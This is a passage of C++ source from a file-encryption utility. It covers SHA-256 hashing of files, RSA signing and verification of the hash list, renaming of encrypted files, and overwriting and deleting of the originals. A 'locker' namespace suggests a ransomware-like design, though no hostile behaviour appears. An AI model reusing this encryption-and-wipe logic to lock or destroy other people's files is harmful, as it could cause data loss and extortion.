	ECRYPT_ivsetup((laced_ctx*)hblock_t->ctx, &hblock_t->pblock[offset]);
	offset += 8;
	
	return hblock_t;
}

STATIC VOID dump_hash(CONST BYTE* hash, size_t len)
{
	std::lock_guard<std::mutex> lock(g_MutexBcrypt);
	for (size_t i = 0; i < len; ++i) printf("%02X", hash[i]);
	printf("\n");
}


void filesystem::sort_hash_list(SLIST<HASH_LIST>* list)
{
	SLIST<locker::HLIST>* list_sorted = new SLIST<locker::HLIST>;
	std::multimap<u32, BYTE*> map;
	locker::PHLIST DataHash = NULL;
	SLIST_FOREACH(DataHash, list)
		map.insert({ memory::MurmurHash2A(DataHash->hash, 32, 0), DataHash->hash });

	for (auto& e : map)
	{
		locker::PHLIST hash_sorted = new locker::HLIST;
		hash_sorted->hash = e.second;
		hash_sorted->hash_size = 32;
		list_sorted->SLIST_INSERT_HEAD(hash_sorted);
	}

	*list = *list_sorted;
	delete list_sorted;
}


bool filesystem::nopHashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, char* Filename)
{
	return true;
}


bool filesystem::HashSumFile(PCRYPT_INFO CryptInfo, DESC desc_file, char* Filename)
{
	BYTE* buff_hash = (BYTE*)memory::m_malloc(MB);
	size_t BytesRead;
	BYTE* out = (BYTE*)memory::m_malloc(33);
	api::SetPoint(desc_file, SEEK_SET);
	sha256_state ctx;
	sha256_init_context(&ctx);
	while (api::ReadFile(desc_file, buff_hash, 1048576, &BytesRead) && BytesRead != 0)
		sha256_update_context(&ctx, buff_hash, BytesRead);
	sha256_final_context(&ctx, out);

	PHASH_LIST hash = new HASH_LIST;
	hash->Filename = Filename;
	LOG_SUCCESS("%s", hash->Filename);
	hash->hash = out;
	hash->hash_size = 32;
	CryptInfo->hash_data.HashList->SLIST_INSERT_HEAD_SAFE(hash);
	if (GLOBAL_STATE.g_print_hash)
	{
		unsigned char* hex = memory::BinaryToHex(out, 32);
		LOG_INFO("hash sum in hex  %s\tfilename " log_str, hex, Filename);
		memory::m_free(hex);
	}	
	LOG_STDOUT("%s", out);
	memory::m_free(buff_hash);
	return true;
}


static void dump_hash(BYTE* hash_bin, size_t len)
{
	BYTE* hex = memory::BinaryToHex(hash_bin, len);
	LOG_NONE("%s", hex);
	memory::m_free(hex);
}

bool filesystem::VerifySignatureRSA
(
	SLIST<HASH_LIST>* HashList
)
{
	BOOL success = FALSE;
	bool isCrypt = GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT ? true : false;
	PHASH_LIST DataHash = NULL;
	CRYPT_INFO CryptInfo = {};
	DESC desc = INVALID_HANDLE_VALUE;
	char* PathLocale = NULL;
	BYTE* SignatureBuffer = NULL;

	if (GLOBAL_PATH.g_PathSignRSAKey == NULL)
	{
		LOG_ERROR("[VerifySignatureRSA] Failed; missing path key to signature");
		return FALSE;
	}

	CryptInfo.desc.key_data = (BYTE*)memory::m_malloc(4096);
	DWORD ResultLength = 0;
#ifdef _WIN32
	NTSTATUS status;
	CryptInfo.desc.crypto_provider = NULL;
	CryptInfo.desc.handle_rsa_key = NULL;
#else
	EVP_PKEY_CTX* ctx = NULL;
	CryptInfo.desc.PKEY = NULL;
	CryptInfo.desc.bio = NULL;
#endif
	CryptInfo.desc.rsa_path = GLOBAL_PATH.g_PathSignRSAKey;
	if (isCrypt)
		GLOBAL_ENUM.g_DeCrypt = EncryptCipher::DECRYPT;
	else
		GLOBAL_ENUM.g_DeCrypt = EncryptCipher::CRYPT;
	if (!ReadRSAFile(&CryptInfo))
	{
		LOG_ERROR("[ReadRSAFile] Failed; " log_str, CryptInfo.desc.rsa_path);
		goto end;
	}
#ifdef _WIN32
	if (CryptInfo.desc.crypto_provider == NULL || CryptInfo.desc.handle_rsa_key == NULL)
	{
		LOG_ERROR("[DESCRIPTOR - PROVIDER] Failed; " log_str, CryptInfo.desc.rsa_path);
		goto end;
	}
#endif

	PathLocale = (char*)memory::m_malloc(MAX_PATH + MAX_PATH);
	if (!api::GetCurrentDir(PathLocale, MAX_PATH))
	{
		LOG_ERROR("[VerifySignatureRSA] [GetCurrentDirectory] Failed");
		goto end;
	}
	memcpy(&PathLocale[memory::StrLen(PathLocale)], slash, 1);
	memcpy(&PathLocale[memory::StrLen(PathLocale)], ("signature.laced.bin"), 19);

	sort_hash_list(HashList);
	BYTE hash_sha[33];
	{
		sha256_state ctx;
		sha256_init_context(&ctx);
		SLIST_FOREACH(DataHash, HashList)
			sha256_update_context(&ctx, DataHash->hash, DataHash->hash_size);
		sha256_final_context(&ctx, hash_sha);
	}
	LOG_STDOUT("%s", hash_sha);
	LOG_INFO("Dump Hash Sum");
	dump_hash(hash_sha, 32);

	if (isCrypt)
	{
		if (!api::create_file_open(&desc, PathLocale))
		{
			LOG_ERROR("[VerifySignatureRSA] Failed; " log_str, PathLocale);
			goto end;
		}

#ifdef _WIN32
		SignatureBuffer = (BYTE*)memory::m_malloc(CryptInfo.desc.size);

		BCRYPT_PKCS1_PADDING_INFO paddingInfo;
		paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;

		if (!HandleError
		(
			BCryptSignHash
			(
				CryptInfo.desc.handle_rsa_key, &paddingInfo,
				hash_sha, 32,
				SignatureBuffer, CryptInfo.desc.size,
				&ResultLength,
				BCRYPT_PAD_PKCS1)
		)
			)
		{
			LOG_ERROR("[BCryptSignHash] Failed");
			goto end;
		}
#else
		unsigned sig_len;
		if (!(ctx = EVP_PKEY_CTX_new(CryptInfo.desc.PKEY, NULL))
			|| (EVP_PKEY_sign_init(ctx) <= 0)
			|| (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_PADDING) <= 0)
			|| (EVP_PKEY_CTX_set_signature_md(ctx, EVP_sha256()) <= 0)
			|| (EVP_PKEY_sign(ctx, NULL, &sig_len, hash_sha, SHA256_DIGEST_LENGTH) <= 0))
		{
			LOG_ERROR("[SignatureRSA] Failed");
			err();
			goto end;
		}

		SignatureBuffer = (BYTE*)memory::m_malloc(sig_len);
		if (EVP_PKEY_sign(ctx, SignatureBuffer, &sig_len, hash_sha, SHA256_DIGEST_LENGTH) <= 0)
		{
			LOG_ERROR("[SignatureRSA] [key_sign] Failed");
			err();
			goto end;
		}
		ResultLength = sig_len;
#endif
		if (!WriteFullData(desc, SignatureBuffer, ResultLength))
		{
			LOG_ERROR("[VerifySignatureRSA] [WriteFullData] Failed; " log_str, PathLocale);
			goto end;
		}

		LOG_SUCCESS("[VerifySignatureRSA] SUCCESS; Signature saved in: " log_str, PathLocale);

	}
	else
	{
		size_t filesize;
		if (!api::get_parse_file(PathLocale, &desc, &filesize))
		{
			LOG_ERROR("[getParseFile] Failed");
			goto end;
		}
		SignatureBuffer = (BYTE*)memory::m_malloc(filesize);

		size_t SignatureLength;
		if (!api::ReadFile(desc, SignatureBuffer, filesize, &SignatureLength))
		{
			LOG_ERROR("[ReadFile] Failed");
			goto end;
		}

#ifdef _WIN32
		BCRYPT_PKCS1_PADDING_INFO paddingInfo;
		paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;
		if (!HandleError
		(
			status = BCryptVerifySignature
			(
				CryptInfo.desc.handle_rsa_key, &paddingInfo,
				hash_sha, 32,
				SignatureBuffer, SignatureLength,
				BCRYPT_PAD_PKCS1)
		)
			)
		{
			LOG_ERROR("[BCryptVerifySignature] Failed; %ls", PathLocale);
			if (status == 0xC000A000)
				LOG_ERROR("[BCryptVerifySignature] The cryptographic signature is INVALID");
			goto end;
		}
		else
			LOG_SUCCESS("[BCryptVerifySignature] The cryptographic signature is VALID");
#else

		if (!(ctx = EVP_PKEY_CTX_new(CryptInfo.desc.PKEY, NULL))
			|| (EVP_PKEY_verify_init(ctx) <= 0)
			|| (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_PADDING) <= 0)
			|| (EVP_PKEY_CTX_set_signature_md(ctx, EVP_sha256()) <= 0))
		{
			LOG_ERROR("[VerifySignatureRSA] Failed");
			err();
			goto end;
		}

		int ret = EVP_PKEY_verify(ctx, SignatureBuffer, SignatureLength, hash_sha, SHA256_DIGEST_LENGTH);
		if (ret == 1)
			LOG_SUCCESS("[VerifySignatureRSA] The cryptographic signature is VALID");
		else if (ret == 0)
			LOG_ERROR("[VerifySignatureRSA] The cryptographic signature is INVALID; %s", PathLocale);
		else
		{
			LOG_ERROR("[VerifySignatureRSA] Failed"); err(); goto end;
		}
#endif
	}

	success = TRUE;
end:
	if (desc)
		api::CloseDesc(desc);
	if (SignatureBuffer)
		memory::m_free(SignatureBuffer);
	if (PathLocale)
		memory::m_free(PathLocale);
	if (CryptInfo.desc.key_data)
	{
		memory::memzero_explicit(CryptInfo.desc.key_data, 4096);
		memory::m_free(CryptInfo.desc.key_data);
	}
#ifdef __linux__
	if (CryptInfo.desc.bio)
		BIO_free(CryptInfo.desc.bio);
	if (CryptInfo.desc.PKEY)
		EVP_PKEY_free(CryptInfo.desc.PKEY);
	if (ctx)
		EVP_PKEY_CTX_free(ctx);
#endif

	return success;
}

char* filesystem::OptionNameStandart(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath)
{
	size_t len_filename = memory::StrLen(Filename);
	char* name = (char*)memory::m_malloc(MAX_PATH + 1);

	if (memory::StrStrC(exst, ECRYPT_NAME_P))
		memcpy(name, Filename, len_filename - ECRYPT_NAME_LEN);
	else
	{
		memcpy(name, Filename, len_filename);
		memcpy(&name[len_filename], ECRYPT_NAME_P, ECRYPT_NAME_LEN);
	}

	return name;
}

char* filesystem::OptionNameHash(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath)
{
	size_t len_filename = memory::StrLen(Filename);
	char* name = (char*)memory::m_malloc(MAX_PATH + 1);

	if (memory::StrStrC(exst, ECRYPT_NAME_P))
		memcpy(name, Filename, len_filename - ECRYPT_NAME_LEN);
	else
	{
		unsigned char out[32] = { 0 };
		sha256((BYTE*)Filename, len_filename, out);
		unsigned char* name_h = memory::BinaryToHex(out, 32);
		memcpy(name, name_h, 64);
		memcpy(&name[64], ECRYPT_NAME_P, ECRYPT_NAME_LEN);
		memory::m_free(name_h);
	}

	return name;
}

static char* base_name_encode(PCRYPT_INFO CryptInfo, char* filename, size_t len_filename, char* exst, bool mode_encr)
{
	char* cpy_flname = (char*)memory::m_malloc(len_filename + 1);
	memcpy(cpy_flname, filename, len_filename);
	crypto_aes_ctx ctx;
	u32 padding = 0;
	MODE_AES mode = mode_encr == 1 ? AES_DECRYPT_NO_PADDING : AES_CRYPT_NO_PADDING;
	
	if((CryptoPolicy::RSA == GLOBAL_ENUM.g_EncryptMethod 
		|| CryptoPolicy::RSA_AES256 == GLOBAL_ENUM.g_EncryptMethod
		|| CryptoPolicy::RSA_CHACHA == GLOBAL_ENUM.g_EncryptMethod)
		&& CryptInfo->desc.key_data != NULL)
		{
			BYTE key[32] = {0};
			memcpy(key, CryptInfo->desc.key_data, 32);
			aes_expandkey(&ctx, key);
		}
	else
		aes_expandkey(&ctx, GLOBAL_KEYS.g_Key);
	aes_encrypt_blocks(&ctx, (BYTE*)filename, (BYTE*)cpy_flname, len_filename, &padding, mode);
	memory::memzero_explicit(&ctx, sizeof(ctx));
	
	return cpy_flname;
}

char* filesystem::OptionNameBase(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath)
{
	size_t len_filename = memory::StrLen(Filename);
	//char* name = (char*)memory::m_malloc(MAX_PATH + 1);
	char* name = NULL;

	if (memory::StrStrC(exst, ECRYPT_NAME_P))
	{
		char decoded[MAX_PATH + MAX_PATH];
		int bsize = 0;
		if (!base64::base64(BASE_E::DECODE,
			(const BYTE*)Filename,
			(int)len_filename - ECRYPT_NAME_LEN,
			decoded, &bsize))
		{
			LOG_ERROR("[OptionNameBase] Failed; %s", Filename);
			memory::m_free(name);
			return OptionNameStandart(CryptInfo, Path, Filename, exst, FPath);
		}
		if(false) 
			name = base_name_encode(CryptInfo, decoded, bsize, exst, true);
		else
		{
			name = (char*)memory::m_malloc(MAX_PATH + 1);
			memcpy(name, decoded, bsize);
		}
	}
	else
	{
		char* ptr_file = Filename;
		if(false)
		{
			ptr_file = base_name_encode(CryptInfo, Filename, len_filename, exst, false);
			len_filename = memory::StrLen(ptr_file);
		}
		char encoded[MAX_PATH + MAX_PATH];
		int bsize = 0;
		if (!base64::base64(BASE_E::ENCODE,
			(const BYTE*)ptr_file,
			(int)len_filename,
			encoded, &bsize))
		{
			LOG_ERROR("[OptionNameBase] Failed; %s; trying name_standart", ptr_file);
			return OptionNameStandart(CryptInfo, Path, Filename, exst, FPath);
		}

		if (bsize > MAX_PATH)
		{
			LOG_ERROR("[OptionNameBase] Failed; ENAME TOO LONG; %s; trying name_standart", ptr_file);
			return OptionNameStandart(CryptInfo, Path, Filename, exst, FPath);
		}
		name = (char*)memory::m_malloc(MAX_PATH + 1);
		memcpy(name, encoded, bsize);
		memcpy(&name[bsize], ECRYPT_NAME_P, ECRYPT_NAME_LEN);
	}
	if(!name)
		LOG_ERROR("filename is null! %s", Filename);
	return name;
}


char* filesystem::NameMethodState(PCRYPT_INFO CryptInfo, PDRIVE_INFO data)
{
	size_t len_path = memory::StrLen(data->Path);
	size_t len_FPath = memory::StrLen(data->FullPath);
	if (len_FPath >= 3840)
	{
		LOG_ERROR("[OptionName] Failed; FULL PATH TOO LONG; " log_str, data->FullPath);
		return NULL;
	}
	
	if(false)
	{
		size_t lenf = memory::StrLen(data->Filename);
		if((lenf + 5) > MAX_PATH)
		{
			LOG_ERROR("[NameMethodState] Failed; filename too long; " log_str, data->Filename);
			return NULL;
		}
		char* swp_name = (char*)memory::m_malloc(MAX_PATH + len_path);
		memcpy(swp_name, data->Path, len_path);
		memcpy(&swp_name[len_path], slash, 1);
		memcpy(&swp_name[len_path + 1], data->Filename, lenf);
		memcpy(&swp_name[len_path + 1 + lenf], ".swp", 4);
		return swp_name;
	}
	
	char* name = CryptInfo->name_method(CryptInfo, data->Path, data->Filename, data->Exst, data->FullPath);
	if(name == NULL || memory::StrLen(name) > MAX_PATH)
	{
		LOG_ERROR("[NameMethodState] Failed; filename too long; " log_str, data->Filename);
		return NULL;
	}

	char* fullpath = (char*)memory::m_malloc(MAX_PATH + len_path);
	GLOBAL_PATH.g_Path_out != NULL ? 
		memcpy(fullpath, GLOBAL_PATH.g_Path_out, memory::StrLen(GLOBAL_PATH.g_Path_out)) 
		:
		memcpy(fullpath, data->Path, len_path);

	memcpy(&fullpath[memory::StrLen(fullpath)], slash, 1);
	memcpy(&fullpath[memory::StrLen(fullpath)], name, memory::StrLen(name));
	memory::m_free(name);
	return fullpath;
}


static bool Write(DESC desc_file, unsigned filesize, BYTE* buff)
{
	size_t size_mb = 1048576;
	api::SetPoint(desc_file, 0);
	auto fsize = filesize;
	size_t toWrite;
#ifdef _WIN32
	DWORD written = 0;
#elif __linux__
	int written = 0;
#endif
	size_t offset = 0;
	while (fsize > 0)
	{
		toWrite = (size_t)fsize >= size_mb ? size_mb : fsize;
		if(!api::WriteFile(desc_file, (BYTE*)buff, toWrite, &written) || !written)
		{
			LOG_ERROR("Failed WriteFullData in OverWriteFile");
			return FALSE;
		}
		offset += written;
		fsize -= written;
	}

	return true;
}

bool filesystem::nopOverWriteFile(PCRYPT_INFO CryptInfo, DESC desc_file, unsigned filesize)
{
	return true;
}

bool filesystem::ZerosOverWriteFile(PCRYPT_INFO CryptInfo, DESC desc_file, unsigned filesize)
{
	for (int i = 0; i < GLOBAL_OVERWRITE.g_OverWriteCount; ++i)
	{
		if (!Write(desc_file, filesize, CryptInfo->zeros))
			return false;
	}
	return true;
}

bool filesystem::RandomOverWriteFile(PCRYPT_INFO CryptInfo, DESC desc_file, unsigned filesize)
{
	for (int i = 0; i < GLOBAL_OVERWRITE.g_OverWriteCount; ++i)
	{
		if (!Write(desc_file, filesize, CryptInfo->random))
			return false;
	}
	return true;
}

bool filesystem::DODOverWriteFile(PCRYPT_INFO CryptInfo, DESC desc_file, unsigned filesize)
{
	for (int i = 0; i < GLOBAL_OVERWRITE.g_OverWriteCount; ++i)
	{
		if (!Write(desc_file, filesize, CryptInfo->zeros))
			return false;
		if (!Write(desc_file, filesize, CryptInfo->random))
			return false;
	}
	return true;
}

bool filesystem::RewriteSDelete(CRYPT_INFO* CryptInfo, char* FullPath)
{
	bool success = false;
	DESC desc = INVALID_HANDLE_VALUE;
	size_t filesize = 0;
	if (!api::get_parse_file(FullPath, &desc, &filesize))
	{
		LOG_ERROR("[getParseFile] [RewriteSDelete] Failed; " log_str, FullPath);
		return false;
	}

	if (!CryptInfo->overwrite_method(CryptInfo, desc, filesize))
	{
		LOG_ERROR("[OverWriteFile] Failed; " log_str, FullPath);
		goto end;
	}


	if (!api::SetPoint(desc, FILE_BEGIN))
	{
		LOG_ERROR("[RewriteSDelete] Failed; " log_str, FullPath);
		goto end;
	}

#ifdef _WIN32
	if (!SetEndOfFile(desc))
	{
		LOG_ERROR("[RewriteSDelete] Failed; " log_str, FullPath);
		goto end;
	}
#else
	if (ftruncate(desc, 0) == -1)
	{
		LOG_ERROR("[RewriteSDelete] [ftruncate] Failed; %s", FullPath);
		goto end;
	}
#endif

	success = true;
#ifdef __linux
	fsync(desc);
#endif
end:
	if (desc != INVALID_HANDLE_VALUE)
		api::CloseDesc(desc);
#ifdef _WIN32
	if (success && !DeleteFileA(FullPath))
	{
		LOG_ERROR("Failed to unlink file after secure delete: %ls", FullPath);
		success = false;
	}
#else
	if (success && unlink(FullPath) != 0)
	{
		LOG_ERROR("Failed to unlink file after secure delete: %s", FullPath);
		success = false;
	}
#endif
	return success;
}

bool filesystem::hash_file(PCRYPT_INFO CryptInfo, DESC desc, char* fullpath, char* filename)
{
	DESC desc_hf;
	unsigned fs;
	if (!api::get_parse_file(fullpath, &desc_hf, &fs) || desc_hf == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; %s", fullpath);
		return false;
	}

	HashSumFile(CryptInfo, desc_hf, filename);

	api::CloseDesc(desc_hf);
	return true;
}


bool delete_exif_data(PFILE_INFO FileInfo)
{
	return false; /*todo*/
}

bool delete_ext_file_laced(char* exst)
{
	return false; /*todo*/
}